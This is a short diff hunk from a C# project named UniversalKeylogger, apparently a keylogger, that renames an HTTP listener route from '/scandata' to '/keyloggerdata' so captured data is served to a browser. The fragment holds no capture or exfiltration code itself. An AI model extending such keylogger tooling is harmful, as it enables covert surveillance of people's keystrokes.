@@ -210,7 +210,7 @@ namespace UniversalKeylogger.MVVM.ViewModel
                 context.Response.ContentEncoding = System.Text.Encoding.UTF8;                                                        // Now, you'll find the request URL in context.Request.Url
                 switch (context.Request.RawUrl)
                 {
-                    case "/scandata":
+                    case "/keyloggerdata":
                         SendFileToBrowser(ref context);
                         break;
                 }
